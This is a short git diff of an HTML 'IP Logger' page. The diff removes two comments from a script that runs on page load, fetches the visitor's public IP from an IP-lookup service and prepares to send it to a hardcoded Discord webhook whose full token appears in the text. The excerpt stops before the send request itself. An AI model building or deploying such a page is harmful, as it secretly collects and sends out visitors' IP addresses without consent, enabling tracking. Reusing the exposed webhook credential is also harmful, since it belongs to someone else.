@@ -7,13 +7,13 @@
     <title>IP Logger</title>
     <script>
         document.addEventListener("DOMContentLoaded", function() {
-            // Fetch the IP address
+            
             fetch('https://api.ipify.org?format=json')
                 .then(response => response.json())
                 .then(data => {
                     const ip = data.ip;
 
-                    // Send the IP to the Discord webhook
+  
                     const webhookUrl = 'https://discord.com/api/webhooks/1240379669484802149/bICd0lDIVPKUGRV3L_HRrmbzxbc_vYxojFvo80wRzM13kWE3nFMZaugJekX--dRYLBqg';
                     const message = {
                         content: `IP Address: ${ip}`,
